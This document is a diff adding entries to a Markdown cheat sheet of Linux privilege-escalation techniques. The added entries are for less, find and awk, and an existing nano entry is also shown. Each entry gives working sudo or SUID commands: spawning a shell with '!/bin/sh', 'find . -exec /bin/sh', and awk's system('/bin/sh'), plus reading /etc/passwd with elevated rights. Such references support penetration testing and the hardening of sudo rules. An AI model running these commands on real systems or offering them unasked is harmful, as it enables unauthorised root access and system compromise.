@@ -125,7 +125,50 @@
   ```sh
   sudo nano
   ```
-  - In nano, press `Ctrl+R` then `Ctrl+X`, then type:
+  • In nano, press `Ctrl+R` then `Ctrl+X`, then type:
   ```sh
   reset; sh 1>&0 2>&0
   ```
+
+### ♦ `less`
+   ⇨ The `less` command can be used to read files with elevated privileges and can also spawn a shell.
+
+**Commands:**
+• Sudo:
+  ```sh
+  sudo less /etc/passwd
+  ```
+  • In less, type:
+  ```sh
+  !/bin/sh
+  ```
+
+### ♦ `find`
+   ⇨ The `find` command can be used to search for files with elevated privileges and can be abused to spawn a shell.
+
+**Commands:**
+• SUID:
+  ```sh
+  sudo install -m =xs $(which find) .
+  ./find . -exec /bin/sh \;
+  ```
+• Sudo:
+  ```sh
+  sudo find . -exec /bin/sh \;
+  ```
+
+### ♦ `awk`
+   ⇨ The `awk` command is a powerful text-processing tool that can be exploited to spawn a shell with elevated privileges.
+
+**Commands:**
+• SUID:
+  ```sh
+  sudo install -m =xs $(which awk) .
+  ./awk 'BEGIN {system("/bin/sh")}'
+  ```
+• Sudo:
+  ```sh
+  sudo awk 'BEGIN {system("/bin/sh")}'
+  ```
+
+---
